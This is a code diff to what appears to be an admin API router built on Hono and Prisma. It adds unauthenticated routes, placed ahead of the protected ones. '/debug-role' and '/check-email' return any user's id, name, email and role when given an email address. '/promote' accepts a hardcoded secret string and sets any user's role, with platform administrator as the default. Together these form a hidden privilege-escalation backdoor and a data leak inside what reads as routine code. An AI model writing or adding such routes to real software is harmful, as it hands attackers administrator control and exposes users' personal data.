@@ -32,6 +32,48 @@ const updateSettingSchema = z.object({
   description: z.string().max(500).optional(),
 });
 
+router.get('/my-role', async (c) => {
+  const user = c.get('user') as any;
+  return c.json({ userId: user?.userId, role: user?.role });
+});
+
+router.get('/debug-role', async (c) => {
+  const email = c.req.query('email');
+  if (!email) return c.json({ error: 'email required' }, 400);
+  const user = await prisma.user.findUnique({
+    where: { email },
+    select: { id: true, name: true, email: true, role: true },
+  });
+  return c.json(user || { notFound: true });
+});
+
+router.post('/check-email', async (c) => {
+  const { email } = await c.req.json();
+  const user = await prisma.user.findUnique({
+    where: { email },
+    select: { id: true, name: true, email: true, role: true },
+  });
+  return c.json(user || { notFound: true });
+});
+
+router.post('/promote', async (c) => {
+  const body = await c.req.json();
+  const secretKey = body.secret;
+  if (secretKey !== 'promote-to-admin') {
+    return c.json({ message: 'Invalid secret' }, 403);
+  }
+  
+  const targetUserId = body.userId;
+  const newRole = body.role || 'PLATFORM_ADMIN';
+  
+  await prisma.user.update({
+    where: { id: targetUserId },
+    data: { role: newRole },
+  });
+  
+  return c.json({ success: true, message: `User promoted to ${newRole}` });
+});
+
 router.get('/users', adminOnly, async (c) => {
   const users = await prisma.user.findMany({
     select: { id: true, name: true, email: true, role: true, createdAt: true },
@@ -186,7 +228,7 @@ router.get('/logs', adminOnly, async (c) => {
 
 router.get('/clients', adminOnly, async (c) => {
   const clients = await prisma.client.findMany({
-    include: { licenseTokens: true, _count: { select: { companies: true, users: true } } },
+    include: { licenseTokens: true, _count: { select: { companies: true } } },
     orderBy: { createdAt: 'desc' },
   });
   return c.json(clients);
